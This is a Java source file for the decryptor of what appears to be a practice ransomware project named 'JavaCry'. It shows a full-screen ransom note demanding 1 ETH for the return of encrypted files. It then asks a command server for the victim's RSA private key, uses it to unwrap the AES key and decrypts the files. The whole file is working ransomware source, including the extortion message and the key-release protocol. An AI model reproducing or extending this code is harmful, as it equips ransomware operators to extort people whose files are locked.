import java.awt.*;
import javax.swing.*;
import javax.swing.border.*;
import java.awt.event.*;
import java.awt.Color;

import java.util.*;
import java.net.*;
import java.io.*;
import java.io.FileOutputStream;
import java.util.stream.Collectors;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.util.Base64;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import java.security.*;
import java.security.InvalidKeyException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import java.security.spec.PKCS8EncodedKeySpec;

/*
   decryptor:
   BTC payment interface
   Request for decryption functionality
   if receives the key, use the key to decrypt the files
   destroy decryptor.java
 */

public class Decryptor {
  private static int id = 823780263;

  // network settings
  private static String address = "127.0.0.1";
  private int port = 5555;

  // socket variables
  private Socket socket;
  private DataOutputStream out     = null;
  private DataInputStream in     = null;

  // crypt settings
  private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
  private String b64privkey;
  private PrivateKey private_key;
  private Cipher RSA_Cipher;
  private Cipher AES_Cipher;
  private static java.util.List<Path> files = new ArrayList<Path>();
  
  private ClientThread backend;

  public Decryptor() {

      String note = String.join("\n"
                                , "<html>"
                                , ""
                                , "<h1 style = 'font-size: 32px; padding: 10px 10px; color: rgb(255,255,255);'>Your files have been encrypted.</h1>"
                                , "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>"
                                , "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 ETH to [My Address]. You can follow this tutorial to send me money: https://www.youtube.com/watch?v=EwxPqbseFrE. I will check the payments before I approve your request for decryption."
                                , "</p>"
                                , "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>"
                                , "<br><b>Don’t delete or modify any content in Key_protected.key, or you will lose your ability to decrypt your files.</b>"
                                , "</p>"
                                , "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>"
                                , "<br>If you want to open this window again, please run Decryptor.jar.<br>"
                                , "</p>"
                                , "</html>"
                                );


      JFrame f = new JFrame();
      JPanel panel = new JPanel();
      JPanel panel2 = new JPanel();
      JLabel html = new JLabel();
      JButton b = new JButton("Request for Decryption");
      JLabel status = new JLabel("");
      URL url = Decryptor.class.getResource("loading.gif");
      ImageIcon imageIcon = new ImageIcon(url);
      JLabel loading = new JLabel(imageIcon);


      html.setText(note);
      html.setAlignmentX(Component.CENTER_ALIGNMENT);
      b.setAlignmentX(Component.CENTER_ALIGNMENT);
      status.setAlignmentX(Component.CENTER_ALIGNMENT);
      status.setAlignmentY(Component.BOTTOM_ALIGNMENT);
      status.setHorizontalAlignment(JLabel.CENTER);
      status.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 14));
      panel2.setBackground(new Color(50, 0, 0));

      b.addActionListener(new ActionListener() {

                      @Override
                      public void actionPerformed(ActionEvent e) {
                        backend = new ClientThread(address, port, id, status, b, loading);
                        backend.start();
                      }
    });

    f.setLayout(new GridLayout(0,1));
    panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
    panel.add(html);
    panel.add(b);
    panel.setBackground(new Color(50, 0, 0));
    f.add(panel);
    panel2.setLayout(new GridLayout(0,1));
    panel2.add(status);
    panel2.add(loading);
    loading.setVisible(false);
    f.add(panel2);
    // f.add(new JButton("Button 1"));
    // f.add(new JButton("Button 2"));

    f.setTitle("JavaCry Decryptor");
    f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    f.setLocationRelativeTo(null);
    f.setExtendedState(JFrame.MAXIMIZED_BOTH);
    f.pack();
    f.setVisible(true);
    html.setFont(new Font(Font.SANS_SERIF, Font.PLAIN, 18));
    b.setFont(new Font("Arial", Font.PLAIN, 30));
    b.setBackground(Color.RED);
    b.setForeground(Color.WHITE);
    b.setOpaque(true);

    status.setForeground(Color.RED);
    b.setBorder(BorderFactory.createCompoundBorder(
      BorderFactory.createLineBorder(Color.RED, 5),
      BorderFactory.createLineBorder(Color.BLACK, 20)));
  }

  public static String getTargetPath() {
    return targetPath;
  }


  // main method
    public static void main(String args[]) {

  // creating instance of Frame class
      Decryptor awt_obj = new Decryptor();

      
    }

}



class ClientThread extends Thread {
    private String state;
    private static String targetPath;
    private static java.util.List<Path> files = new ArrayList<Path>();
    private String b64privkey;
    private PrivateKey private_key;
    private Cipher RSA_Cipher;
    private Cipher AES_Cipher;
    private Socket socket;
    private String address;
    private JLabel status;
    private JLabel loading;
    private JButton button;
    private int port;
    private int id;

    public ClientThread(String address, int port, int id, JLabel status, JButton button, JLabel loading) {
        state = "<def>";
        targetPath = Decryptor.getTargetPath();
        this.port = port;
        this.address = address;
        this.id = id;
        this.status = status;
        this.loading = loading;
        this.button = button;
        System.out.println("backend initialized");
    }


    public void run() {
      status.setText("Waiting for approval");
      
      loading.setVisible(true);
      RequestForDecryption();
      loading.setVisible(false);
    }


    public void RequestForDecryption() {
      try
      {
          button.setEnabled(false);
          System.out.println("trying to connect");
          socket = new Socket(address, port);
          System.out.println("connected");

          // sends output to the socket
          DataInputStream in = new DataInputStream(socket.getInputStream());
          DataOutputStream out = new DataOutputStream(socket.getOutputStream());

          out.writeUTF(String.valueOf(id));
          b64privkey = in.readUTF();
          System.out.println(b64privkey);
          if (b64privkey.equals("but I refuse")) {
            status.setText("Your request has been rejected.");
            button.setEnabled(true);
            return;
          }
          byte[] pub = Base64.getDecoder().decode(b64privkey);
          PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(pub);
          KeyFactory factory = KeyFactory.getInstance("RSA");
          private_key = factory.generatePrivate(spec);

          RSA_Cipher = Cipher.getInstance("RSA");
          AES_Cipher = Cipher.getInstance("AES");
          try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                  files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
          }
          catch (Exception err) {
                  ;
          }
          try {
            decryptFiles();
            status.setText("Your request has been accepted.");
            button.setEnabled(true);
          }
          catch (Exception err) {
            status.setText("Request failed.");
            button.setEnabled(true);
          }
      }
      catch(UnknownHostException u)
      {
          status.setText("Request failed.");
          button.setEnabled(true);
          System.out.println(u);
      }
      catch(IOException i)
      {
        status.setText("Request failed.");
        button.setEnabled(true);
        System.out.println(i);
      } catch (Exception err) {
        status.setText("Request failed.");
        button.setEnabled(true);
        System.out.println(err);
      }
    }

    public byte[] RSACrypt(File f) {
      try {
          FileInputStream in = new FileInputStream(f);
          byte[] input = new byte[(int) f.length()];
          in.read(input);
  
          FileOutputStream out = new FileOutputStream(f);
          byte[] output = RSA_Cipher.doFinal(input);
  
          return output;
      } catch (Exception e) {
          System.out.println(e);
      }
      return null;
    }
  
    public void AESCrypt(File f) {
      try {
          FileInputStream in = new FileInputStream(f);
          byte[] input = new byte[(int) f.length()];
          in.read(input);
  
          FileOutputStream out = new FileOutputStream(f);
          byte[] output = AES_Cipher.doFinal(input);
          out.write(output);
  
          out.flush();
          out.close();
          in.close();
          System.out.println("Decrypting file: " + f);
      } catch (Exception e) {
          System.out.println(e);
      }
    }

    public void decryptFiles() throws Exception {
  
      RSA_Cipher.init(Cipher.DECRYPT_MODE, private_key);
      File k = new File("Key_protected.key");
      byte[] data = RSACrypt(k);
      SecretKey AESKey = new SecretKeySpec(data, 0, data.length, "AES");
      AES_Cipher.init(Cipher.DECRYPT_MODE, AESKey);
      for (Path p : files) {
              try {
                      File f = p.toFile();
                      AESCrypt(f);
              } catch (Exception e) {
                      System.out.println(e);
              }
      }
  
    }
}


